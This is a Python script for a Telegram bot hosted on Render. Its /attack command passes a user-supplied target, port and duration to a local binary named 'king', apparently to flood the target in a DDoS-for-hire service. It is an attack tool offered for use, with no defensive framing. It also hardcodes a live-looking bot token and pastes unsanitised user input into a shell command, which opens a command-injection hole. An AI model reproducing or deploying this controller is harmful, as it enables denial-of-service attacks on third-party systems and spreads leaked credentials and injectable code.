#!/usr/bin/python3
import telebot
import subprocess
import os
import time
from flask import Flask
from threading import Thread

# --- CONFIGURATION ---
TOKEN = '8435736634:AAGLe5AFljrt6l0nveG6nJBGy7jo2ZtbriU'
bot = telebot.TeleBot(TOKEN)

# --- DUMMY SERVER FOR RENDER HEALTH CHECK ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running!"

def run():
    app.run(host='0.0.0.0', port=8080)

# --- BOT COMMANDS ---

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, f"🚀 Welcome {user_name}! Bot is active on Render.\nUse /attack to start.")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    command = message.text.split()
    if len(command) == 4:
        target, port, duration = command[1], command[2], command[3]
        
        # UI Response
        username = message.from_user.first_name
        bot.reply_to(message, f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🚀🚀\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {duration}s\n𝐌𝐞𝐭𝐡𝐨ᴅ: VIP KALA JADU")

        # Binary Execution with Permissions
        try:
            os.chmod("./king", 0o755) # Permission dena zaroori hai
            full_command = f"./king {target} {port} {duration} 100"
            subprocess.run(full_command, shell=True)
            bot.send_message(message.chat.id, f"✅ Attack Finished on {target}:{port}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    else:
        bot.reply_to(message, "✅ Usage: /attack <target> <port> <time>")

# --- DEPLOYMENT LOGIC ---
if __name__ == "__main__":
    # 1. Start Web Server in Background (For Render)
    t = Thread(target=run)
    t.start()
    
    # 2. Start Bot Polling with Auto-Restart
    print("Bot is starting on Render...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Crash detected: {e}. Restarting...")
            time.sleep(5)
          
